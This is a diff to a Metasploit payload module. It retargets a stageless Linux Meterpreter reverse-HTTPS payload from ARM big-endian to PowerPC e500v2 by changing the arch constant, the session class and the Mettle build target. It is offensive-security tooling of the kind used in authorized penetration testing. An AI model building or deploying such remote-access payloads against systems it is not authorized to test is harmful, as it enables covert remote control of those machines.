@@ -6,11 +6,9 @@
 require 'msf/core/handler/reverse_https'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
-require 'msf/base/sessions/meterpreter_armbe_linux'
+require 'msf/base/sessions/meterpreter_ppce500v2_linux'
 
 module MetasploitModule
-
-  CachedSize = 678568
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -28,10 +26,10 @@ module MetasploitModule
           'timwr'
         ],
         'Platform'      => 'linux',
-        'Arch'          => ARCH_ARMBE,
+        'Arch'          => ARCH_PPCE500V2,
         'License'       => MSF_LICENSE,
         'Handler'       => Msf::Handler::ReverseHttps,
-        'Session'       => Msf::Sessions::Meterpreter_armbe_Linux
+        'Session'       => Msf::Sessions::Meterpreter_ppce500v2_Linux
       )
     )
   end
@@ -41,6 +39,6 @@ module MetasploitModule
       scheme: 'https',
       stageless: true
     }
-    MetasploitPayloads::Mettle.new('armv5b-linux-musleabi', generate_config(opts)).to_binary :exec
+    MetasploitPayloads::Mettle.new('powerpc-e500v2-linux-musl', generate_config(opts)).to_binary :exec
   end
 end
